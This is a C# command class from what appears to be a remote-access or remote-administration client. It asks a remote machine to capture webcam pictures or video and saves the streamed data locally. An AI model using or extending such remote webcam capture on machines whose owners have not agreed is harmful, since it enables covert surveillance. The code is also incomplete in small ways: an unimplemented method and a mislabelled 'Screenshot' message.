using Shared;
using System;
using System.Collections.Generic;
using System.IO;

namespace ClientCommands
{
    internal class Webcam : ICommand
    {
        public string name { get; } = "webcam";

        public string description { get; } = "Webcam control utility, able to take pictures and record videos";

        public string syntaxHelper { get; } = "webcam [picture|video] [fileToWrite]";

        public bool isLocal { get; } = false;

        public List<string> validArguments { get; } = new List<string>()
        {
            "picture ?",
            "video ?"
        };

        
        public bool PreProcess(List<string> args)
        {
            throw  new NotImplementedException();
        }

        public void Process(List<string> args)
        {
            var fileName = args[1];

            var result = ClientCommandsManager.networkManager.ReadLine();

            if (result != "OK")
            {
                ColorTools.WriteCommandError(result == "KO"
                    ? "Unable to use the webcam in the default timespan, maybe another application is using it"
                    : "Unable to find a webcam on the remote server");

                return;
            }

            // Get data length
            var dataLength = int.Parse(ClientCommandsManager.networkManager.ReadLine());

            try
            {
                using (var fs = new FileStream(fileName, FileMode.Create))
                {
                    ClientCommandsManager.networkManager.NetworkStreamToStream(fs, dataLength);
                }

                ColorTools.WriteCommandSuccess($"Screenshot saved : {fileName}");
            }
            catch (Exception)
            {
                // Delete the partially created file
                File.Delete(fileName);
                ColorTools.WriteCommandError("An error occured");
            }
        }
    }
}
